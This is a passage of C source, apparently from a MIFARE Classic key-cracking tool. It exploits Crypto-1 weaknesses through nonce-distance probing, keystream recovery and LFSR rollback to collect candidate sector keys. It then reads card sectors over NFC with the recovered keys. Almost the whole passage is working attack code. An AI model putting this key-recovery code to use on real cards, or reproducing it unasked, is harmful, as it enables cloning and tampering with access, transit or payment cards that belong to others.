		// Parity validity check
		for (i = 0; i < 3; ++i) {
			d->parity[i] = (oddparity(Rx[i]) != RxPar[i]);
		}		
	
		// Iterate over Nt-x, Nt+x
		// fprintf(stdout, "Iterate from %d to %d\n", d->median-TOLERANCE, d->median+TOLERANCE);
		NtProbe = prng_successor(Nt, d->median-d->tolerance);
		for (m = d->median-d->tolerance; m <= d->median+d->tolerance; m +=2) {
			
			// Try to recover the keystream1 
			Ks1 = NtEnc ^ NtProbe;
					
			// Skip this nonce after invalid 3b parity check
			revstate_start = NULL;
			if (valid_nonce(NtProbe, NtEnc, Ks1, d->parity)) {
				// And finally recover the first 32 bits of the key
				revstate = lfsr_recovery32(Ks1, NtProbe ^ t.uid);
                                if (revstate_start == NULL) {
                                        revstate_start = revstate;
                                }
				while ((revstate->odd != 0x0) || (revstate->even != 0x0)) {
					lfsr_rollback_word(revstate, NtProbe ^ t.uid, 0);
					crypto1_get_lfsr(revstate, &lfsr);
					// Allocate a new space for keys
					if (((kcount % MEM_CHUNK) == 0) || (kcount >= pk->size)) {
						pk->size += MEM_CHUNK;
						// fprintf(stdout, "New chunk by %d, sizeof %lu\n", kcount, pk->size * sizeof(uint64_t));
						pk->possibleKeys = (uint64_t *) realloc((void *)pk->possibleKeys, pk->size * sizeof(uint64_t));
						if (pk->possibleKeys == NULL) {
							fprintf(stderr, "Memory allocation error for pk->possibleKeys\n"); 
							gets_s(end,11);
							exit(1);
						}
					}
					pk->possibleKeys[kcount] = lfsr;
					kcount++;
					revstate++;
				}
				free(revstate_start);
			}
			NtProbe = prng_successor(NtProbe, 2);
		}
		// Truncate
		if (kcount != 0) {
			pk->size = --kcount;
			if ((pk->possibleKeys = (uint64_t *) realloc((void *)pk->possibleKeys, pk->size * sizeof(uint64_t))) == NULL) {
				fprintf(stderr, "Memory allocation error for pk->possibleKeys\n"); 
				gets_s(end,11);
				exit(1);
			}		
		}
	}
	crypto1_destroy(pcs);
	return 0;
}

// Return the median value from the nonce distances array
uint32_t median(denonce d) {
	int middle = (int) d.num_distances / 2;
	qsort(d.distances, d.num_distances, sizeof(u_int32_t), compar_int);
	
	if (d.num_distances % 2 == 1) {
		// Odd number of elements
		return d.distances[middle];
	} else {
		// Even number of elements, return the smaller value
		return (uint32_t) (d.distances[middle-1]);
	}
}

int compar_int(const void * a, const void * b) {
	return (*(uint64_t*)b - *(uint64_t*)a);
}

// Compare countKeys structure
int compar_special_int(const void * a, const void * b) {
	return (((countKeys *)b)->count - ((countKeys *)a)->count);
}

countKeys * uniqsort(uint64_t * possibleKeys, uint32_t size) {
	int i, j = 0;
	int count = 0;
	countKeys *our_counts;
	
	qsort(possibleKeys, size, sizeof (uint64_t), compar_int);
	
	our_counts = (countKeys *)calloc(size, sizeof(countKeys));
	if (our_counts == NULL) {
		fprintf(stderr, "Memory allocation error for our_counts\n");
		gets_s(end,11);
		exit(1);
	}
	
	for (i = 0; i < size; i++) {
        if (possibleKeys[i+1] == possibleKeys[i]) { 
			count++;
		} else {
			our_counts[j].key = possibleKeys[i];
			our_counts[j].count = count;
			j++;
			count=0;
		}
	}
	qsort(our_counts, j, sizeof(countKeys), compar_special_int);
	return (our_counts);
}


// Return 1 if the nonce is invalid else return 0
int valid_nonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, byte_t * parity) {
	return ((odd_parity((Nt >> 24) & 0xFF) == ((parity[0]) ^ odd_parity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1,16))) & \
	(odd_parity((Nt >> 16) & 0xFF) == ((parity[1]) ^ odd_parity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1,8))) & \
	(odd_parity((Nt >> 8) & 0xFF) == ((parity[2]) ^ odd_parity((NtEnc >> 8) & 0xFF) ^ BIT(Ks1,0)))) ? 1 : 0;
}

void num_to_bytes(uint64_t n, uint32_t len, byte_t* dest) {
	while (len--) {
		dest[len] = (byte_t) n;
		n >>= 8;
	}
}

long long unsigned int bytes_to_num(byte_t* src, uint32_t len) {
	uint64_t num = 0;
	while (len--)
	{
		num = (num << 8) | (*src);
		src++;
	}
	return num;
}

uint8_t sectorToFirstBlock(uint8_t sector){
	uint8_t result = 0;	
	if(sector<=32){
		result = sector * 4;
	}else{
		result = 32 * 4 + (16*(sector-32));
	}
	return result;
}

unsigned int numberOfBlocks(uint8_t sector){
	return sector<32 ? 4:16;
}

void readSector(nfc_device_t * pnd, mifare_sector* sector,nfc_target_info_t *t, bool onlyA){
	static mifare_param mp;
	uint8_t block = sectorToFirstBlock(sector->sector)+numberOfBlocks(sector->sector)-1;
	memcpy(mp.mpa.abtKey,sector->KeyA, sizeof(sector->KeyA));
	memcpy(mp.mpa.abtUid,t->nai.abtUid,4);
	if(nfc_initiator_mifare_cmd(pnd, MC_AUTH_A, block, &mp)){
		int i;
		for(i=numberOfBlocks(sector->sector)-1;i>=0;i--){
			if (nfc_initiator_mifare_cmd(pnd, MC_READ, block, &mp)) {
				fprintf(stdout, "Block %02d, type %c, key %012llx :", block, 'A', bytes_to_num(sector->KeyA, 6));
				print_hex(mp.mpd.abtData, 16);
				memcpy(sector->Data[i],mp.mpd.abtData,16);
			}else{
				mf_configure(pnd);
				nfc_initiator_select_passive_target(pnd, NM_ISO14443A_106, NULL, 0, t);
				printf("Read error.\n");
				break;
			}
			block--;
		}
	}else{
		printf("Error : ");
		fprintf(stdout, "Block %02d, type %c, key %012llx :", block, 'A', bytes_to_num(sector->KeyA, 6));
		printf("\n");
		mf_configure(pnd);
		nfc_initiator_select_passive_target(pnd, NM_ISO14443A_106, NULL, 0, t);
	}
}